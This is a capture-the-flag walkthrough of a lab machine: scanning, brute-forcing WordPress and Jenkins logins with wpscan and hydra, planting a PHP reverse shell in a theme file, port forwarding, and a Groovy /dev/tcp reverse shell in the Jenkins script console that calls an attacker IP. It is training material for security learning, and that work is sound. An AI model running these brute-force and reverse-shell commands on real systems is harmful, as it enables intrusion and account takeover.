Starting off with deploying the machine, exporting IP and quickly scanning the open ports with rustscan,

```bash
export IP=10.10.103.145
rustscan -a $IP --range 0-65535 --ulimit 5000 -- -sVC -Pn -oN nmap.log
```

Result scan shows that port 22 is running ssh service and port 80 is running apache webserver. Let's dive it.

Starting enumeration on port 80 by visiting http://$IP and we land on a Apache Default webpage,

Let's quickly add the IP address of the machine corresponding with domain name of **internal.thm** in /etc/hosts file so that we don't have to navigate to IP address everytime, and we can just navigate to internal.thm, which will present us with webpage of the website,

```bash
echo "$IP    internal.thm" >> /etc/hosts
```

After all of this, let's fuzz the directories to see if there is any hidden path we found,

```bash
dirsearch -u http://internal.thm -t 50 -w /usr/share/seclists/Discovery/Web-Content/common.txt -q 2>/dev/null
```

and we did, a **/wordpress**, which is super interesting.

Navigating to http://internal.thm/wordpress and we will land on a webpage which shows us that it is indeed a wordpress website,

![image](https://user-images.githubusercontent.com/67465230/161196193-c76f5bb7-3c67-4849-827a-e8734c83c8b0.png)

I was just playing around and tried to search something with letter 'a' but didn't got anything,

![image](https://user-images.githubusercontent.com/67465230/161196205-881e9711-e4c4-4d44-9d30-f58dc8a7088b.png)

Then I decided to scan this website using **wpscan** tool,

```bash
wpscan --url http://internal.thm/wordpress/ -e | tee wpscan.log
```

![image](https://user-images.githubusercontent.com/67465230/161196218-fabcb9ec-5710-4607-91a5-aba6de98ae3d.png)

after enumerating the website with wpscan, we got a username **admin** (this made my life easier!).

Now, I already know that I can't login into website yet because I don't have any credentials yet so first I wrote down the username in user.txt file and then using the rockyou.txt, I brute forced the credentials of admin user,

```bash
wpscan --url http://internal.thm/wordpress/ -U user.txt -P /usr/share/wordlists/rockyou.txt -t 10
```

![image](https://user-images.githubusercontent.com/67465230/161196238-3e66ad85-c1c6-4943-b015-29c716574ecf.png)

after 30 minutes or so, I got the admin password.

So let's visit http://internal.thm/blog/wp-login.php, enter credentials and boom, we got access to panel

![image](https://user-images.githubusercontent.com/67465230/161196249-77ba45ab-afb2-4015-8f52-1beeb3f0bc48.png)

After roaming all over the website, I finally noticed that there is a private post which has no title at all,

![image](https://user-images.githubusercontent.com/67465230/161196264-1f080fc3-801c-4244-b026-7e0eb33c4e93.png)

So I clicked onto the private blog and we can see the credentials of william user,

![image](https://user-images.githubusercontent.com/67465230/161196269-40da28d6-3a47-4165-bedb-9e8dc71fd9cf.png)

So I tried to ssh using these credentials just to know that this is a rabit hole,

```bash
ssh william@internal.thm
```

![image](https://user-images.githubusercontent.com/67465230/161196290-f374e9ad-5b66-4310-8f12-000b23c405a6.png)

Then I move forward with finding a 404.php file in wordpress and there I saw that I can edit this file so I put my [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell) here, *I already changed my IP and port*

![image](https://user-images.githubusercontent.com/67465230/161196303-459334ee-b798-4fe2-90e3-85540d9be9a8.png)

After saving the file, we can start the listener using `nc -nvlp 4444` and then we can trigger the shell by issuing a request,

```bash
curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

and we can see that we will get the reverse shell as **www-data user**,

![image](https://user-images.githubusercontent.com/67465230/161196311-d1373ae8-775c-4df4-b3b9-e34d5a5024b5.png)

We know that the current shell is unstable so we'll make this shell stable using sequence of commands,

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
CTRL + Z
stty raw -echo; fg
stty rows 56 columns 238
```

Enumerating the whole system and there is a **wp-save.txt** file in /opt directory and reading the file gives us the credentials of aubreanna user,

![image](https://user-images.githubusercontent.com/67465230/161196326-53051408-95e9-4094-8641-303abd25aa11.png)

Let's switch to aubreanna user quickly,

![image](https://user-images.githubusercontent.com/67465230/161196338-286533e2-e238-41b1-86f8-9bf509ea58d3.png)

Enumerating home directory of aubreanna user and we get a user flag and a jenkins.txt file,

![image](https://user-images.githubusercontent.com/67465230/161196356-78ceb5b3-e213-4df3-8023-2967ec69be98.png)

Viewing the content of the jenkins file and we can see that the internal jenkins service is running on 172.17.0.2:8080 port,

![image](https://user-images.githubusercontent.com/67465230/161196362-e2f378e7-dc0a-4ec7-bd07-3e381c29a243.png)

Let's check the network statistics by issuing `netstat` command and we can see that port 8080 is internally open,

```bash
netstat -tlnp
```

![image](https://user-images.githubusercontent.com/67465230/161196375-47454e62-471a-4408-bc04-94eb51530646.png)

With ssh port forwarding, we can access the internal port,

```bash
ssh -L 8081:127.0.0.1:8080 aubreanna@internal.thm
```

![image](https://user-images.githubusercontent.com/67465230/161196380-7b0997b5-e52f-415c-880f-b00eba7e63fc.png)

after visiting the http://127.0.0.1:8080 we are redirected to jenkins login page and from here, we need a way to get access to panel. But since we don't have credentials, we need to brute force them.

I started the burp suite, let the burp catches the request having a POST request with the credentials of admin:admin,

![image](https://user-images.githubusercontent.com/67465230/161196388-ca70221f-6ff4-44e5-bf0d-2967302b678a.png)

We will use this POST data in hydra tool to brute force the credentials of the admin user, 

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8081 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password"
```

![image](https://user-images.githubusercontent.com/67465230/161196397-8dababca-fecd-4da5-9474-0ddc484a963c.png)

after waiting for sometime, we got the credential for admin user.

After accessing the panel, we're being welcomed to jenkins dashboard,

![image](https://user-images.githubusercontent.com/67465230/161196405-55deb898-87ed-4594-8af3-0979913132af.png)

Navigating around the website and there I got the script console which we can used to get a reverse shell on the system,

![image](https://user-images.githubusercontent.com/67465230/161196410-eaf41e15-e34b-404b-8129-1a48448026d1.png)

So I pasted a JAVA reverse shell and started the netcat listener using `nc -nvlp 5555`, we get the reverse shell,

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.9.11.12/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

From here, I got a real unstable shell which I tried to make it stable but can't. So I decided to enumerate the things further and got the note.txt file in /opt directory and there I got the root user credentials,

![image](https://user-images.githubusercontent.com/67465230/161196431-297d237f-598a-4e16-9595-d9b0e3d68ae7.png)

After then I decided switch to root user on the shell where I got the note.txt file, but was unsuccessful. Then I tried the same credentials of root user on ssh and successfully got the system access,
